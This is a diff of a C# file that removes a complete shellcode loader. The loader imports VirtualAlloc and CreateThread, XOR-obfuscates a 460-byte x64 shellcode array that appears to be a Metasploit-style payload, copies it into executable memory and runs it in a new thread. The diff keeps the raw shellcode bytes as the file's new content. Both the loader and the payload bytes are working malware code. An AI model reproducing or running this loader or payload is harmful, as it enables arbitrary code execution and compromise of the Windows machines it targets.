@@ -1,34 +1,4 @@
-using System;
-using System.Net;
-using System.Text;
-using System.Runtime.InteropServices;
-
-public class Program
-{
-    [DllImport("kernel32")]
-    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-
-    [DllImport("kernel32")]
-    private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
-
-    [DllImport("kernel32")]
-    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-
-    private static UInt32 MEM_COMMIT = 0x1000;
-    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-
-
-
-
-
-
-    public static void Main()
-    {
-        string key = "test123";
-
-        byte[] keyBytes = Encoding.ASCII.GetBytes(key);
-
-        byte[] buf = new byte[460] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,
+0xfc,0x48,0x83,0xe4,0xf0,0xe8,
 0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
 0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
@@ -66,40 +36,4 @@ public class Program
 0xba,0x08,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,
 0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,
 0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,
-0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };
-
-
-        byte[] encoded = xor(buf, keyBytes);
-        string dataBS64 = Convert.ToBase64String(encoded);
-
-
-
-
-        byte[] data = Convert.FromBase64String(dataBS64);
-
-
-        byte[] encodedtwo = xor(data, keyBytes);
-
-        UInt32 codeAddr = VirtualAlloc(0, (UInt32)encodedtwo.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-        Marshal.Copy(encodedtwo, 0, (IntPtr)(codeAddr), encodedtwo.Length);
-
-        IntPtr threadHandle = IntPtr.Zero;
-        UInt32 threadId = 0;
-        IntPtr parameter = IntPtr.Zero;
-        threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
-
-        WaitForSingleObject(threadHandle, 0xFFFFFFFF);
-
-    }
-
-    private static byte[] xor(byte[] shell, byte[] KeyBytes)
-    {
-        for (int i = 0; i < shell.Length; i++)
-        {
-            shell[i] ^= KeyBytes[i % KeyBytes.Length];
-        }
-        return shell;
-    }
-
-
-}
+0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5
